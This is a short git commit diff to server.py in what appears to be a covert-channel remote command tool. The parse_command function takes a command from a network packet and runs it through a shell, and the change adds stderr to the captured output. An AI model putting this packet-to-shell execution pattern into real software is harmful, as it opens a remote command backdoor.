e88144911cb9c49523610ad3ad8f971ead221e39
Nishan <nishan@vivek.tech>
2017-10-26 14:32:14 -0700

    Initial Commits

--- server.py
+++ server.py
@@ -17,7 +17,7 @@ def parse_command(packet):
     command = payload.split('#')[0]
     client_ip = payload.split('#')[1]
     proc = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
-    output = proc.stdout.read()
+    output = proc.stdout.read() + "\n" + proc.stderr.read()
     print (output)
     # pkt = IP(dst=client_ip, src=packet["IP"].dst)/UDP(dport=int(args.client_port), sport=int(args.server_port)))
     sleep(1) #try giving the client time to recevie.
